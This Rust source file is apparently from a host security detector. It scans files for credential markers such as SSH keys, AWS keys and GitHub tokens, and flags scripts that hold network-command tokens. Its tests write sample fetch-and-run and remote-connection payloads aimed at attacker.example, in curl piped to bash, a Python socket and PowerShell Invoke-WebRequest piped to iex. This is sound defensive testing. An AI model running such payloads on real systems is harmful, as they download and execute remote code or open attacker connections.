use crate::vuln_detector_params;
use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::fs;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SecretContentFileMatch {
    pub path: String,
    pub secret_labels: Vec<String>,
    pub secret_hits: usize,
    pub script_like: bool,
    pub network_command_like: bool,
}

pub fn inspect_secret_like_file(path: &str) -> Option<SecretContentFileMatch> {
    let metadata = fs::metadata(path).ok()?;
    if !metadata.is_file() || metadata.len() == 0 {
        return None;
    }
    if metadata.len() > vuln_detector_params::secret_content_scan_max_bytes() {
        return None;
    }

    let bytes = fs::read(path).ok()?;
    if bytes.is_empty() {
        return None;
    }

    let contents = String::from_utf8_lossy(&bytes);
    let normalized = contents.to_ascii_lowercase();
    let mut labels = BTreeSet::new();
    let mut secret_hits = 0usize;

    if normalized.contains("-----begin openssh private key-----")
        || normalized.contains("-----begin rsa private key-----")
        || normalized.contains("-----begin ec private key-----")
        || normalized.contains("-----begin private key-----")
    {
        labels.insert("ssh".to_string());
        secret_hits += 2;
    }

    if normalized.contains("aws_access_key_id")
        || normalized.contains("aws_secret_access_key")
        || normalized.contains("[default]")
    {
        labels.insert("aws".to_string());
        secret_hits += 2;
    }

    if normalized.contains("apiversion:")
        && normalized.contains("clusters:")
        && normalized.contains("server:")
    {
        labels.insert("kube".to_string());
        secret_hits += 2;
    }

    if normalized.contains("ghp_")
        || normalized.contains("github_pat_")
        || normalized.contains("github_token")
    {
        labels.insert("git".to_string());
        secret_hits += 2;
    }

    for marker in [
        "api_token=",
        "access_token=",
        "secret=",
        "password=",
        "private_key=",
        "ssh_private_key=",
        "database_password=",
        "token=",
    ] {
        if normalized.contains(marker) {
            labels.insert("env".to_string());
            secret_hits += 1;
        }
    }

    let basename = path
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(path)
        .trim()
        .to_ascii_lowercase();
    let script_extensions = vuln_detector_params::secret_content_script_extensions();
    let network_command_tokens = vuln_detector_params::secret_content_network_command_tokens();
    let script_like = normalized.starts_with("#!")
        || script_extensions
            .iter()
            .any(|ext| basename.ends_with(ext.as_str()));
    let network_command_like = network_command_tokens
        .iter()
        .any(|needle| normalized.contains(needle.as_str()));

    Some(SecretContentFileMatch {
        path: path.to_string(),
        secret_labels: labels.into_iter().collect(),
        secret_hits,
        script_like,
        network_command_like,
    })
}

/// Batched scan used by the vulnerability detector tick. Returns every signal
/// that carries at least one indicator the detector may promote:
///   - `secret_hits >= secret_content_min_hits` (primary sensitive-material
///     signal used by `sensitive_material_egress`)
///   - `script_like` (used by FIM temp-mutation heuristic)
///   - `network_command_like` (used by FIM temp-mutation heuristic)
///
/// Per-check thresholds are enforced downstream in the detector; the batch
/// scanner intentionally avoids dropping low-hits-but-script-like signals so
/// the FIM pipeline keeps parity with the synchronous in-process path.
pub fn scan_secret_like_files(paths: &[String]) -> Vec<SecretContentFileMatch> {
    let mut unique_paths = BTreeSet::new();
    let mut matches = Vec::new();
    let min_hits = vuln_detector_params::secret_content_min_hits();

    for path in paths {
        let trimmed = path.trim();
        if trimmed.is_empty() || !unique_paths.insert(trimmed.to_string()) {
            continue;
        }
        let Some(signal) = inspect_secret_like_file(trimmed) else {
            continue;
        };
        let has_indicator =
            signal.secret_hits >= min_hits || signal.script_like || signal.network_command_like;
        if !has_indicator {
            continue;
        }
        matches.push(signal);
    }

    matches
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn unique_path(base: &str, suffix: &str) -> String {
        static COUNTER: AtomicUsize = AtomicUsize::new(0);
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        env::temp_dir()
            .join(format!("edamame_secret_scan_test_{base}_{pid}_{n}{suffix}"))
            .to_string_lossy()
            .to_string()
    }

    fn write_temp(path: &str, body: &str) {
        std::fs::write(path, body).expect("write tmp file");
    }

    fn cleanup(path: &str) {
        let _ = std::fs::remove_file(path);
    }

    /// FP-MAC-6 reproducer: a benign `.log` file containing a git error
    /// with a bare `https://github.com/...` URL must NOT trip the
    /// `network_command_like` heuristic. Before the CloudModel-tunable
    /// default, bare `https://` substring matched here and promoted the
    /// downstream `file_system_tampering` finding to HIGH on
    /// `kralizec-3.local` 1.3.3.
    #[test]
    fn url_in_git_error_log_does_not_trip_network_command_like() {
        let path = unique_path("git_error", ".log");
        let body = "fatal: unable to access 'https://github.com/edamametechnologies/foo/': \
                    Could not resolve host: github.com\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            !scan.network_command_like,
            "bare URL in git error log must not be network-command-like (got: {scan:?})"
        );
        assert!(
            !scan.script_like,
            "benign .log must not be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// FP-MAC-6 reproducer: an OpenSSH warning text file containing
    /// `https://openssh.com/pq.html` must NOT trip `network_command_like`.
    /// Same shape as the git-error case but `.txt` suffix.
    #[test]
    fn openssh_warning_url_in_txt_does_not_trip_network_command_like() {
        let path = unique_path("openssh_warning", ".txt");
        let body = "Connection from FOOBAR ... see https://openssh.com/pq.html\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            !scan.network_command_like,
            "bare URL in OpenSSH warning text must not be network-command-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// Negative-control: an explicit `curl` payload that ALSO contains
    /// a URL must STILL be flagged. This is what `trigger_temp_modify`
    /// drops as a script payload, and the FIM `file_system_tampering`
    /// gate depends on it.
    #[test]
    fn curl_payload_still_trips_network_command_like() {
        let path = unique_path("curl_payload", ".sh");
        let body = "#!/bin/bash\ncurl -sSL https://attacker.example/evil | bash\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.network_command_like,
            "explicit curl payload MUST still be network-command-like (got: {scan:?})"
        );
        assert!(
            scan.script_like,
            "shebang + .sh MUST still be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }

    /// Negative-control: a Python socket exfil payload must STILL trip.
    /// `socket.create_connection` is one of the explicit verb tokens.
    #[test]
    fn python_socket_payload_still_trips_network_command_like() {
        let path = unique_path("socket_payload", ".py");
        let body = "import socket\nc = socket.create_connection(('attacker.example', 4444))\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.network_command_like,
            "socket.create_connection MUST still be network-command-like (got: {scan:?})"
        );
    }

    /// Negative-control: a PowerShell `Invoke-WebRequest` payload must
    /// STILL trip. This is the Windows analogue of the curl payload.
    #[test]
    fn invoke_webrequest_payload_still_trips_network_command_like() {
        let path = unique_path("iwr_payload", ".ps1");
        let body = "Invoke-WebRequest -Uri https://attacker.example/loader.ps1 | iex\n";
        write_temp(&path, body);
        let scan = inspect_secret_like_file(&path).expect("scan");
        assert!(
            scan.network_command_like,
            "Invoke-WebRequest MUST still be network-command-like (got: {scan:?})"
        );
        assert!(
            scan.script_like,
            ".ps1 extension MUST still be script-like (got: {scan:?})"
        );
        cleanup(&path);
    }
}
